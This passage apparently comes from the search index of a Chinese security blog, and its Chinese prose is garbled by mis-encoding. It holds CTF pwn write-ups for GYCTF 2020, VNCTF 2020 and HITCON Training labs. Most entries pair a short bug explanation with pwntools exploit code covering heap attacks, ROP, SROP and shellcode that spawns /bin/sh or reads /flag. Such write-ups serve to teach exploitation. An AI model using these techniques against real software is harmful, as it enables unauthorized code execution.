fake = 0x602060-0x8 add(0x40,p64(fake)) # 3 \u003c-\u003e 1 add(0x40) # 4 \u003c-\u003e 2 add(0x40) # 5 \u003c-\u003e 1 add(0x40,p64(elf.got['puts'])) # 6 \u003c-\u003e fake show(0) ru(':') puts = uu64(r(6)) libc = LibcSearcher('puts', puts) base = puts - libc.dump('puts') system = base + libc.dump('system') free_hook = base + libc.dump('__free_hook') edit(6,p64(free_hook)) edit(0,p64(system)) add(0x8,'/bin/sh\\x00') # 7 free(7) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:1:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"GYCTF 2020 ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"borrowstack ç”¨ leave_ret æ ˆè¿ç§»åˆ° bss æ®µï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ ˆä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼Œéœ€è¦ç•™è¶³å¤Ÿçš„ offset ç¡®ä¿è¿ç§»ä¹‹åå¡«çš„ payload ä¸ä¼šè¦†ç›–åˆ°ä¸‹é¢çš„ got è¡¨ã€‚æˆ‘ç›´æ¥æŠŠ payload é•¿åº¦åŠ èµ·æ¥ç•™äº†ä¸€äº›ä½™é‡ä½œä¸º offsetï¼Œå®é™…ä¸Šè¿™é‡Œçš„ offset ç”šè‡³å¯ä»¥çˆ†ç ´å‡ºæ¥ã€‚ leave_ret = 0x400699 bank = 0x601080 pop_rdi = 0x400703 offset = 0xa0 payload = flat('a'*0x60,bank+offset,leave_ret) sa('want\\n',payload) payload = flat('a'*offset,bank+offset,pop_rdi,elf.got['puts'],elf.plt['puts'],elf.sym['main']) sa('now!\\n',payload) base = uu64(r(6)) - libc.sym['puts'] leak('base',base) one = base + 0x4526a payload = flat('a'*0x60,'a'*8,one) sa('want\\n',payload) sa('now!\\n','a') ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"some_thing_exceting æ¯æ¬¡ç”³è¯·åˆ›å»ºä¸‰ä¸ªå †å—ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ç»“æ„ä½“æŒ‡é’ˆä¸¤ä¸ªæ˜¯å­—ç¬¦ä¸²ã€‚è€Œé‡Šæ”¾æ—¶æ²¡æœ‰ç½® NULLï¼Œåˆ©ç”¨ double free å°±å¯ä»¥ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸² chunk çš„ fd æŒ‡é’ˆï¼ŒæŒ‡å‘å·²ç»åœ¨ bss æ®µä¸Šçš„ flagã€‚ä¸è¿‡å¯¹åº”ä½ç½®çš„ä¼ªé€  size å­—æ®µä¸º 0x60ï¼Œå› æ­¤ä¸ºäº†é€šè¿‡ fastbin æ£€æŸ¥éœ€è¦ä½¿ç”¨ 0x50 çš„å­—ç¬¦ä¸² chunkã€‚ flag = 0x6020a8 add(0x60,0x50) add(0x60,0x50) add(0x60,0x50) free(0) free(1) free(0) add(0x50,0x50,p64(flag-0x10)) add(0x50,0x50) show(1) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"some_thing_interesting å’Œä¸Šé¢˜ä¸åŒçš„æ˜¯æ²¡æœ‰ flag åœ¨ bss æ®µäº†ï¼Œä½†æ˜¯å¤šå‡ºäº†ä¸€ä¸ªæ£€æŸ¥ code çš„é€‰é¡¹ï¼Œè¯¥å‡½æ•°å†…å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æµ‹å‡ºåç§»ä¸º 17ï¼Œæ³„éœ² libcã€‚ éšåï¼Œç”±äºæœ¬é¢˜çš„ edit å‡½æ•°æ˜¯å¯ä»¥ç”¨çš„ï¼Œæˆ‘ä»¬ä¸éœ€è¦ double free äº†ï¼Œç›´æ¥ uaf å°±å¯ä»¥ä¿®æ”¹ __malloc_hook ä¸º one_gadget äº†ã€‚ code = 'OreOOrereOOreO' sla(':',code+'%17$p') sla(':','0') ru(code) base = int(ru('\\n'),16) - 0x20830 leak('base',base) add(0x60,0x60) add(0x60,0x60) free(1) free(2) edit(1,p64(base+libc.sym['__malloc_hook']-0x23)) add(0x60,0x60) add(0x60,0x60) edit(4,'a'*0x13+p64(base+0xf1147)) sla(':','1') sla(':',str(0x60)) ä¸¤é“ something ä¼¼ä¹æ”¹ç¼–è‡ª ACTF2020 çš„ä¸¤é“ SCP Foundationã€‚ ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"signin ç¨‹åºåˆ†é…çš„å—å¤§å°å›ºå®šä¸º 0x70ï¼Œæœ€å¤šç”³è¯· 9 ä¸ªï¼›edit åŠŸèƒ½åªèƒ½ç”¨ä¸€æ¬¡ï¼Œä¸è¿‡å¹¶æ²¡æœ‰æ£€æŸ¥ chunk æ˜¯å¦æ˜¯ free çš„ï¼›delete æ£€æŸ¥äº† chunk æ˜¯å¦ä¸º freeï¼Œå¹¶ä¸”é‡Šæ”¾ä¹‹åå°† chunk å¯¹åº”çš„ flag æ ‡è®°ä¸º freeï¼Œå› æ­¤æ— æ³• double freeï¼Œä¸è¿‡æŒ‡é’ˆä¾ç„¶æ²¡æœ‰ç½® NULLã€‚ æ­¤å¤–è¿˜å­˜åœ¨åé—¨å‡½æ•°ï¼Œå…ˆ calloc(1,0x70)ï¼Œç„¶åå¦‚æœå…¨å±€å˜é‡ ptr ä¸ä¸ºç©ºå°±èƒ½ getshellã€‚é¢˜ç›®ç¯å¢ƒä¸º Ubuntu 18ï¼Œé‚£ä¹ˆæ€è·¯å°±æ˜¯åˆ©ç”¨ tcache æœºåˆ¶ã€‚å…ˆå¡«æ»¡ tcacheï¼Œéšåå¯¹ tcache ä¸­ç¬¬ä¸€ä¸ª chunk æŠ•æ¯’ï¼Œå³ä¿®æ”¹ fd æŒ‡å‘ ptr ä¸Šæ–¹çš„ fake chunkï¼Œç„¶åç”³è¯·å‡ºä¸€å— tcache chunkï¼Œæ­¤æ—¶ fake chunk å°±ä¼šè¿›å…¥ tcache ä¸­ã€‚å†ç”³è¯·ä¸€æ¬¡å³å¯ getshellã€‚ for i in range(8): add(i) for i in range(8): free(i) dbg() edit(7,p64(0x4040c0-0x10)) add(8) dbg() sla('?','6') dbg() ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"force ç¨‹åºæ²¡æœ‰å¯¹ç”³è¯·çš„å¤§å°è¿›è¡Œæ£€æŸ¥ï¼Œç»“åˆé¢˜ç›®åå¯ä»¥æƒ³åˆ° House of Forceã€‚å…ˆç”³è¯·ä¸€ä¸ªå¾ˆå¤§çš„ chunk ç´§æŒ¨ç€ libcï¼Œå¯ä»¥æ³„éœ²å‡º libcã€‚è¿™é‡Œçš„åç§»æ˜¯é€šè¿‡ gdb è°ƒè¯•å¾—åˆ°çš„ï¼Œå°†é¢˜ç›®ç»™å‡ºçš„åœ°å€å’Œ libc_base è¿›è¡Œ distance å³å¯ã€‚éšåä¿®æ”¹ top chunk å¤§å°åŒæ—¶æ³„éœ²å †åœ°å€ã€‚è¿™æ · top chunk åœ°å€ä¹Ÿå¾—åˆ°äº†ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨ pwngdb å·¥å…·ï¼Œè°ƒè¯•çš„æ—¶å€™å…ˆæŸ¥çœ‹ heapbaseï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€ä½œä¸ºå‚æ•°ä¼ ç»™ force å‘½ä»¤ï¼Œå³å¯å¾—åˆ° nb=-48ï¼Œä»è€Œç®—å‡º evil_size ä¸º malloc_hook-top-0x30ã€‚ç”³è¯·ä¸€ä¸ª evil_size å¤§å°çš„ chunkï¼Œç„¶åå†ç”³è¯·å°±èƒ½å¾—åˆ° __malloc_hook é™„è¿‘çš„ chunkï¼Œç”±äº one_gadget æ¡ä»¶ä¸æ»¡è¶³ï¼Œè¿™é‡Œå€Ÿç”¨äº† realloc å»è¦†ç›– __malloc_hookã€‚ distance = 0x5b2010 base = add(0x20000)-distance leak('base',base) heap = add(0x10,'\\x00'*0x18+p64(0xffffffffffffffff))-0x10 leak('heap',heap) top = heap+0x20 malloc_hook = base+libc.sym['__malloc_hook'] one = base+0x4526a realloc = base+libc.sym['realloc'] # force heapbase evil = malloc_hook-top-0x30 add(evil) payload = flat('a'*8,one,realloc+4) add(len(payload),payload) sla('puts\\n','1') sla('size\\n',str(0x10)) éœ€è¦æ³¨æ„è¿œç¨‹çš„ chunk åˆ° libc åç§»é‡ä¸æœ¬åœ°ä¸åŒï¼Œä½†æ˜¯ä¸èƒ½é€šè¿‡è°ƒè¯•å¾—åˆ°ã€‚æ­¤æ—¶å¯ä»¥çˆ†ç ´è¯¥åç§»ï¼Œåˆç”±äº ASLR ä¸æ”¹å˜ä½ 12 ä½ï¼Œåªéœ€è¦æ­¥é•¿ä¸º 0x1000ã€‚ ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"bf_note æœ¬é¢˜å…³é”®åœ¨äºè¯»å– title é•¿åº¦æ—¶å¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯åé¢ç”¨çš„æ—¶å€™ä¾ç„¶ç”¨çš„æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ²¡æœ‰ç»è¿‡é™åˆ¶çš„é•¿åº¦å˜é‡ã€‚æ­¤å¤–ï¼Œåœ¨è¯»å…¥ description å’Œ postscript æ—¶å­˜åœ¨æ ˆæº¢å‡ºã€‚ æ¥ä¸‹æ¥çš„æ­¥éª¤å¯¹æˆ‘è€Œè¨€å±äºæ–°å§¿åŠ¿ï¼Œè€Œ åŸ writeup å†™å¾—æŒºè¯¦ç»†äº†ï¼Œå»ºè®®å‚è€ƒã€‚ ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"document æœ¬é¢˜å­˜åœ¨æ˜æ˜¾çš„ uaf æ¼æ´ï¼Œå…³é”®åœ¨äºé€šè¿‡é€†å‘å¼„æ¸…ç»“æ„ä½“çš„ç»“æ„ï¼š ----------------------- | prev_size | size=0x21 | ----------------------- -- | ptr | sex=1 | | ----------------------- | | prev_size | size=0x91 | | ----------------------- --\u003e | name | sex=1 | ----------------------- | | | information | | | ----------------------- é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨çš„æ€è·¯å°±å¾ˆç®€å•äº†ï¼Œé¦–å…ˆç”±äº information æ‰€åœ¨çš„ chunk å›ºå®šç”³è¯· 0x80ï¼Œä¹Ÿå°±æ˜¯å®é™… 0x90 å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥é‡Šæ”¾æ‰ä¸€å—æ¥æ³„éœ² libcã€‚ç„¶åæ–°ç”³è¯·çš„ 0x20 å †å—éƒ½ä¼šä»ä»é‡Šæ”¾çš„è¿™å—ä¸­åˆ‡å‰²ï¼Œè¿™æ ·åªéœ€è¦åœ¨ ptr é‡Œå†™å…¥ free_hook-0x10ï¼Œé‚£ä¹ˆåœ¨ç¼–è¾‘ information æ—¶ï¼Œfree_hook å°±è½åœ¨äº†å›¾ä¸­çš„ information ä½ç½®ï¼Œæˆ‘ä»¬å†™ä¸Š system å³å¯ã€‚ add('/bin/sh\\x00') # 0 add() # 1 add() # 2 free(1) show(1) ru('\\n') base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) free_hook = base+libc.sym['__free_hook'] system = base+libc.sym['system'] add() # 3 add() # 4 edit(1,flat(0,0x21,free_hook-0x10,1)+p64(0)*10) edit(4,p64(system)+p64(1)+p64(0)*12) free(0) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:2:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"VNCTF 2020 ç¬¬ä¸€æ¬¡è§åˆ°å †é¢˜æ¯”æ ˆé¢˜è§£ç­”äººæ•°è¿˜å¤šçš„æ¯”èµ›ã€‚ ","date":"2020-03-01","objectID":"/recent-pwn-medium/:3:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"simpleHeap ç¼–è¾‘æ—¶å­˜åœ¨ off by oneï¼Œå¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„å¤§å°åä»¤å…¶è¿›å…¥ unsorted bin æ³„éœ² libcã€‚ç„¶åä¿®æ”¹ malloc_hook ä¸º one_gadgetï¼Œæ³¨æ„éœ€è¦é€šè¿‡ realloc è°ƒæ•´ rsp æ¥æ»¡è¶³ one_gadget æ¡ä»¶ã€‚ add(0x18) # 0 add(0x68) # 1 add(0x68) # 2 add(0x18) # 3 edit(0,'a'*0x18+'\\xe1') free(1) add(0x68) # 1 show(2) base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) malloc_hook = base+libc.sym['__malloc_hook'] add(0x60) # 4 \u003c-\u003e 2 free(3) free(2) edit(4,p64(malloc_hook-0x23)+'\\n') add(0x60) add(0x60,flat('a'*11,base+0x4526a,base+libc.sym['realloc']+13)) sla(':',str(_add)) sla('?',str(0x18)) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:3:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"easyTHeap free æ—¶æŒ‡é’ˆæœªç½® NULLã€‚å…ˆåˆ©ç”¨ tcache double free æ³„éœ²å †åœ°å€ï¼Œéšå tcache æŠ•æ¯’æ‹¿åˆ° tcache_perthread_structï¼Œä¿®æ”¹ count ä»¤ tcache å…¨è¢«å¡«æ»¡ï¼Œå†æ¬¡ free æ—¶å°±ä¼šè¿›å…¥ unsorted bin æ³„éœ² libcã€‚æ¥ä¸‹æ¥ä¾ç„¶æ˜¯è¦†ç›– malloc_hook ä¸º one_gadget ä»¥åŠé€šè¿‡ realloc è°ƒæ•´ rspï¼Œä¸è¿‡ç”±äºç¯å¢ƒæ˜¯ 2.27ï¼Œone_gadgetã€åç§»é‡ç­‰ç­‰éƒ½ä¼šä¼šæœ‰æ‰€ä¸åŒï¼Œunsorted bin æ³„éœ²çš„åœ°å€ä¹Ÿå˜æˆäº† main_arena+96 è€Œé +88ã€‚ add(0x80) # 0 add(0x80) # 1 free(0) free(0) show(0) heap = uu64(r(6))-0x260 leak('heap',heap) tps = heap+0x10 add(0x80) # 2 \u003c-\u003e 0 edit(2,p64(tps)) add(0x80) # 3 \u003c-\u003e 1 add(0x80) # 4 \u003c-\u003e tps edit(4,'\\x07'*8+'\\x00'*0x70+p64(tps+0x78)) free(0) show(0) base = uu64(r(6))-0x60-libc.sym['__malloc_hook']-0x10 leak('base',base) one = base+0x10a38c malloc_hook = base+libc.sym['__malloc_hook'] edit(4,'\\x07'*8+'\\x00'*0x70+p64(malloc_hook-0x8)) add(0x80) # 5 edit(5,flat(one,base+libc.sym['realloc']+4)) sla(':',str(_add)) sla('?',str(0x10)) ","date":"2020-03-01","objectID":"/recent-pwn-medium/:3:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"warmup åªèƒ½æº¢å‡º 0x10 å­—èŠ‚ï¼Œä½†æ˜¯ä¸Šä¸€ä¸ªæ ˆå¸§çš„ buf ç©ºé—´è¾ƒå¤§ä¸”å¯æ§ï¼Œå› æ­¤å¯ä»¥å¤š ret ä¸€æ¬¡å›åˆ°ä¸Šä¸€ä¸ªæ ˆå¸§çš„ buf é‡Œæ„é€  ROP é“¾ã€‚æ­¤å¤–ï¼Œç¨‹åºå¼€å¯äº† seccomp æ²™ç®±ç¦æ­¢ execveï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½æ„é€  ORW è¯» flagã€‚å¹¸è¿çš„æ˜¯é¢˜ç›®ç›´æ¥ç»™äº† puts åœ°å€ï¼Œå¯ä»¥å¾—åˆ° libc åœ°å€ä»è€Œä½¿ç”¨ libc çš„ gadgetsï¼Œè€Œ ORW ä½¿ç”¨çš„ç¼“å†²åŒºä¹Ÿå¯ä»¥åˆ©ç”¨ libc çš„ rw æ®µã€‚ ru('0x') puts = int(ru('\\n'),16) base = puts-libc.sym['puts'] leak('base',base) pop_rdi = base+0x21102 pop2 = base+0x1150c9 # rdx,rsi ret = base+0x937 open = base+libc.sym['open'] read = base+libc.sym['read'] buf = base+libc.sym['_IO_2_1_stderr_'] chain = [ # read(0,buf,8) pop_rdi,0,pop2,8,buf,read, # open(buf,0,0) pop_rdi,buf,pop2,0,0,open, # read(3,buf,0x100) pop_rdi,3,pop2,0x100,buf,read, # puts(buf) pop_rdi,buf,puts ] sa('thing:',flat(chain)) payload = flat('a'*0x70,'a'*8,ret) sa('name?',payload) s('/flag\\x00\\x00\\x00') ","date":"2020-03-01","objectID":"/recent-pwn-medium/:3:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babybabypwn_1 çœ‹åˆ°ç¨‹åºä¸»åŠ¨è°ƒç”¨ syscall(15,\u0026buf) å¯çŸ¥æ˜¯ SROPï¼Œæˆ‘ä»¬éœ€è¦åœ¨ buf é‡Œæ”¾ä¼ªé€ çš„ Sigreturn Frameï¼Œç„¶åç¨‹åºå°±ä¼šè°ƒç”¨ rt_sigreturn æ¢å¤æˆ‘ä»¬ä¼ªé€ çš„ frameã€‚åŒæ ·å¼€å¯äº†æ²™ç®±ï¼Œä¾ç„¶æ˜¯æ„é€  ORW è¯» flagã€‚ è¿™é‡Œåœ¨ä½¿ç”¨ pwnlib.rop.srop æ¨¡å—æ—¶ï¼Œç”¨ SigreturnFrame æ„é€ æ—¶å‡ºç°äº†ä¸€äº›é—®é¢˜ï¼Œæš‚æ—¶è¿˜ä¸æ¸…æ¥šåŸå› ï¼Œä½¿ç”¨äº†æ‰‹åŠ¨æ„é€  frame çš„åŠæ³•ã€‚ ru('0x') puts = int(ru('\\n'),16) base = puts-libc.sym['puts'] leak('base',base) pop_rdi = base+0x21102 pop2 = base+0x1150c9 syscall = base+libc.sym['syscall'] open = base+libc.sym['open'] read = base+libc.sym['read'] buf = base+0x3c6500 frame = p64(0) * 12 frame += p64(0) # rdi frame += p64(0) # rsi frame += p64(0) # rbp frame += p64(0) # rbx frame += p64(buf-0x10) # rdx frame += p64(0) # rax frame += p64(0x100) # rcx frame += p64(buf) # rsp frame += p64(syscall) # rip frame += p64(0) # eflags frame += p64(0x33) # cs/fs/gs frame += p64(0)*7 sa('message:',frame) chain = [ '/flag\\x00\\x00\\x00',0, # open(buf-0x10,0,0) pop_rdi,buf-0x10,pop2,0,0,open, # read(3,buf+0x100,0x100) pop_rdi,3,pop2,0x100,buf+0x100,read, # puts(buf+0x100) pop_rdi,buf+0x100,puts ] s(flat(chain)) æ›´æ–°ï¼šå‚è€ƒ AiDai å¸ˆå‚…çš„æ–¹æ³•ï¼Œå¯ä»¥è‡ªåŠ¨æ„é€  frameï¼Œå¹¶ä¸”ä¸éœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼š ru('0x') puts = int(ru('\\n'),16) base = puts-libc.sym['puts'] leak('base',base) pop_rdi = base+0x21102 pop2 = base+0x1150c9 open = base+libc.sym['open'] read = base+libc.sym['read'] buf = base+libc.bss() frame = SigreturnFrame() frame.rdi = 0 frame.rsi = buf frame.rdx = 0x100 frame.rsp = buf frame.rip = read sa('message:',str(frame)[8:]) chain = [ # read(0,buf,0x100) pop_rdi,0,pop2,0x100,buf,read, # open(buf,0,0) pop_rdi,buf,pop2,0,0,open, # read(3,buf,0x100) pop_rdi,3,pop2,0x100,buf,read, # puts(buf) pop_rdi,buf,puts ] s(flat(chain)) s('/flag\\x00') ","date":"2020-03-01","objectID":"/recent-pwn-medium/:3:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"è¿‘æœŸè¿›é˜¶ Pwn åˆé›†","uri":"/recent-pwn-medium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"HITCON Training æ›´æ–°å®Œæˆï¼Œæ²¡å’•å’•ã€‚å…¶ä¸­å †é¢˜çœŸæ˜¯å¾ˆé€‚åˆå…¥é—¨ã€‚ ","date":"2020-02-16","objectID":"/hitcon-training/:0:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab1 - sysmagic æºç ï¼š #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e void get_flag(){ int fd ; int password; int magic ; char key[] =\"Do_you_know_why_my_teammate_Orange_is_so_angry???\"; char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66}; fd = open(\"/dev/urandom\",0); read(fd,\u0026password,4); printf(\"Give me maigc :\"); scanf(\"%d\",\u0026magic); if(password == magic){ for(int i = 0 ; i \u003c sizeof(cipher) ; i++){ printf(\"%c\",cipher[i]^key[i]); } } } int main(){ setvbuf(stdout,0,2,0); get_flag(); return 0 ; } /dev/urandom çš„éšæœºæ•°æ˜¯å¾ˆéš¾é¢„æµ‹çš„ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½æƒ³åŠæ³•è®© if æ¡ä»¶åˆ¤æ–­å¤±æ•ˆã€‚å¯ä»¥ç”¨ IDA å°†å¯¹åº”çš„ jnz è¯­å¥ patch æˆ jz å°±å¯ä»¥æ‰“å° flag äº†ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ gdb è®¾ç½® eip è·³è¿‡è¿™ä¸ª jnzã€‚ ","date":"2020-02-16","objectID":"/hitcon-training/:1:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab2 - orw æœ¬é¢˜æ²¡æœ‰æä¾›æºç ã€‚å¼€äº† seccomp æ²™ç®±ï¼Œåªèƒ½ç”¨ orw å†™ shellcodeï¼Œé¢˜ç›®ä¼šè‡ªåŠ¨æ‰§è¡Œå†™å…¥çš„ shellcodeã€‚ from pwn import * binary = './orw.bin' context.binary = binary p = process(binary) shellcode = shellcraft.open('/flag',0) + shellcraft.read('eax','esp',100) + shellcraft.write(1,'esp',100) p.sendlineafter(':',asm(shellcode)) p.interactive() ","date":"2020-02-16","objectID":"/hitcon-training/:2:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab3 - ret2sc æºç ï¼š #include \u003cstdio.h\u003e char name[50]; int main(){ setvbuf(stdout,0,2,0); printf(\"Name:\"); read(0,name,50); char buf[20]; printf(\"Try your best:\"); gets(buf); return ; } æ²¡æœ‰å¼€å¯ NXï¼Œå› æ­¤ç¬¬ä¸€æ¬¡è¾“å…¥å¯ä»¥è¾“å…¥ shellcode æ”¾åœ¨ bss æ®µï¼Œç¬¬äºŒæ¬¡è¾“å…¥æ ˆæº¢å‡ºè¿”å›åˆ° shellcode æ‰€åœ¨åœ°å€ã€‚ from pwn import * binary = './ret2sc' context.binary = binary p = process(binary) name = 0x804a060 p.sendlineafter(':',asm(shellcraft.sh())) p.sendlineafter(':',flat('a'*32,name)) p.interactive() ","date":"2020-02-16","objectID":"/hitcon-training/:3:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab4 - ret2lib æºç ï¼š #include \u003cstdio.h\u003e void See_something(unsigned int addr){ int *address ; address = (int *)addr ; printf(\"The content of the address : %p\\n\",*address); }; void Print_message(char *mesg){ char buf[48]; strcpy(buf,mesg); printf(\"Your message is : %s\",buf); } int main(){ char address[10] ; char message[256]; unsigned int addr ; puts(\"###############################\"); puts(\"Do you know return to library ?\"); puts(\"###############################\"); puts(\"What do you want to see in memory?\"); printf(\"Give me an address (in dec) :\"); fflush(stdout); read(0,address,10); addr = strtol(address); See_something(addr) ; printf(\"Leave some message for me :\"); fflush(stdout); read(0,message,256); Print_message(message); puts(\"Thanks you ~\"); return 0 ; } ç»å…¸çš„ ret2libc é¢˜ç›®ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥å¯ä»¥ç›´æ¥æ³„éœ² GOT åœ°å€ï¼Œç¬¬äºŒæ¬¡æ ˆæº¢å‡ºè¿”å›åˆ° system(\"/bin/sh\")ã€‚ sla(':',elf.got['puts']) ru('0x') puts = int(ru('\\n'),16) base,libc,system = leak_libc('puts',puts) binsh = base+libc.dump('str_bin_sh') sla(':',flat('a'*60,system,'a'*4,binsh)) ","date":"2020-02-16","objectID":"/hitcon-training/:4:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab5 - simplerop æºç ï¼š #include \u003cstdio.h\u003e int main(){ char buf[20]; puts(\"ROP is easy is'nt it ?\"); printf(\"Your input :\"); fflush(stdout); read(0,buf,100); } ç¨‹åºæ˜¯é™æ€é“¾æ¥çš„ï¼Œå…¶ä¸­æœ‰å¾ˆå¤š gadgets ä½†æ²¡æœ‰ /bin/shï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå·±å†™åˆ° bss æ®µä¸Šå»ï¼Œç„¶å ret2syscallã€‚ read = 0x806cd50 pop_eax = 0x80bae06 pop_dcb = 0x806e850 int_80 = 0x80493e1 chain = [ 'a'*32, # read(0,bss,8) read,pop_dcb,0,elf.bss(),8, # execve('/bin/sh',0,0) pop_dcb,0,0,elf.bss(),pop_eax,0xb,int_80 ] sla(':',flat(chain)) s('/bin/sh\\x00') ","date":"2020-02-16","objectID":"/hitcon-training/:5:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"HITCON Training ç»ƒä¹ è®°å½•","uri":"/hitcon-training/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lab6 - migration æºç ï¼š #include \u003cstdio.h\u003e int count = 1337 ; int main(){ if(count != 1337) _exit(1); count++; char buf[40]; setvbuf(stdout,0,2,0); puts(\"Try your best :\"); read(0,buf,64); return ; } è®¾ç½®äº† count ä½¿å¾— main ä¸èƒ½æ‰§è¡Œç¬¬äºŒæ¬¡ã€‚è¿™å¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥å®ç° ret2libcï¼ŒåŒæ—¶æ 